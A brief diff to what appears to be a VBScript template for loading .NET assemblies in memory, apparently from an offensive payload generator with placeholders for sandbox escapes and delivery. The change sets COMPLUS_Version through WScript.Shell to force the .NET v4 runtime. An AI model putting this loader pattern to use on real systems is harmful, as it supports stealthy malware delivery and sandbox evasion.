@@ -2,6 +2,9 @@ Sub DebugPrint(s)
 End Sub
 
 Sub SetVersion
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"
 End Sub
 
 Function Base64ToStream(b)
@@ -286,7 +289,6 @@ Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
 
 %SANDBOX_ESCAPES%
 %DELIVERY%
-
 
 End Sub
 
